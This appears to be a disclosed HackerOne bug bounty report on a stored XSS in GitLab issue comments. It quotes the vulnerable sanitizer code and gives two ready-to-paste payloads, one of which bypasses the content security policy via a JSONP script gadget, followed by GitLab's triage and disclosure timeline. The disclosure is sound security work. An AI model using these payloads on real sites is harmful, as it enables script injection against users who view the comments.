---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/gitlab
  - vuln/xss-stored
  - vuln/xss
  - fix/csp
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2022-06-08
submitted: 2021-11-11T14:55:36.689Z
bounty_usd: 3000
votes: 38
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "jarij"
source: "https://hackerone.com/reports/1398305"
title: "Stored XSS on issue comments and other pages which contain notes"
---
# Stored XSS on issue comments and other pages which contain notes

> **Severity:** High | **Bounty:** 3,000 USD | **Votes:** 38 | **Program:** GitLab | **Disclosed:** 2022-06-08

- Report: [https://hackerone.com/reports/1398305](https://hackerone.com/reports/1398305)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2021-11-11T14:55:36.689Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

This report contains two XSS sanitization bypasses:

* The [SyntaxHighlightFilter](https://gitlab.com/gitlab-org/gitlab/-/blob/c2e5d7b89b84cc5b44575592bb706ef75c3d1bbb/lib/banzai/filter/syntax_highlight_filter.rb) creates html from unsanitized data. This can be used to bypass the XSS filter on the server-side. 

```ruby
 def highlight_node(node)
...
sourcepos = node.parent.attr('data-sourcepos')
...
sourcepos_attr = sourcepos ? "data-sourcepos=\"#{sourcepos}\"" : ""

 highlighted = %(<pre #{sourcepos_attr} class="#{css_classes}"
                             lang="#{language}"
                             #{lang_params}
                             v-pre="true"><code>#{code}</code></pre>)
```

* The [gl-emoji](https://gitlab.com/gitlab-org/gitlab/-/blob/5b0bedde99d676116221b56ad75fa89ccf8a9f28/app/assets/javascripts/behaviors/gl_emoji.js) custom element can be used to bypass the gitlab-ui `v-safe-html` directive sanitization on the frontend side by injecting the payload into the name attribute:

```js
export function emojiImageTag(name, src) {
  return `<img class="emoji" title=":${name}:" alt=":${name}:" src="${src}" width="20" height="20" align="absmiddle" />`;
}
```

* Gitlab SaaS is not vulnerable because this report does not include CSP bypass. I'm currently working on this.

### Steps to reproduce

{F1510920}

1. Launch self-managed Gitlab instance
2. Create issue
3. Copy and paste the following payload into the comment field:

```
<pre data-sourcepos="&#34; href=&#34;x&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

#### Results of GitLab environment info

```
# gitlab-rake gitlab:env:info         

System information
System:
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.7.4p191
Gem Version:    3.1.4
Bundler Version:2.1.4
Rake Version:   13.0.6
Redis Version:  6.0.16
Git Version:    2.33.0.
Sidekiq Version:6.2.2
Go Version:     unknown

GitLab information
Version:        14.4.2-ee
Revision:       84aa6daaffd
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     12.7
URL:            http://localhost:8888
HTTP Clone URL: http://localhost:8888/some-group/some-project.git
SSH Clone URL:  git@localhost:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        13.21.1
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## Impact

Attacker who can comment on issue will be able to XSS users that visit that issue. This also affects other pages where comments can be posted, such as snippets.

## Timeline

- **Report Filed**
- **2021-11-12** @jarij: Here's the CSP bypass. To reproduce this issue on gitlab.com:

* Create new private project
* Create new issue
* Copy and paste the following payload into the comment field:

```
<pre data-sourcepos="&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34><iframe srcdoc=&#34;<script src=https://apis.google.com/complete/search?client=chrome&amp;q=alert(document.domain);//&amp;callback=setTimeout></script>&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

{F1511542}
- **Report Severity Updated**
- **Report Severity Updated**
- **Changed Scope**
- **2021-11-14** @nmalcolm_gitlab: Hello jarij,

Thank you for submitting this report!

We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/345657.  This issue will be made public 30 days following the release of a patch.

We typically award a partial bounty at the time of triage, as per our [H1 Policy](https://hackerone.com/gitlab). I am holding off on awarding a bounty at this time as I wait on the engineering team to indicate whether this is a duplicate issue or not. I'll get back to you as soon as I know more!

We will also continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Nick Malcolm
GitLab Security Team
- **2021-11-15** @nmalcolm_gitlab: Hello again,

I've verified that this is not a duplicate. Given the severity of the report, we are paying an initial $1000 on triage. Congratulations!

We will continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Nick Malcolm
GitLab Security Team
- **Bounty Awarded**
- **Report Triaged**
- **2021-11-16** @jarij: Thanks!
- **2021-11-17** @gitlab-securitybot: ETA for fix:

Hi @jarij,

The issue you reported is currently scheduled to be fixed by 2021-12-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2022-01-05** @gitlab-securitybot: ETA for fix:

Hi @jarij,

The issue you reported is currently scheduled to be fixed by 2022-01-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **2022-05-25** @jarij: Can we disclose this? @nmalcolm_gitlab
- **Agreed On Going Public**
- **Report Became Public**
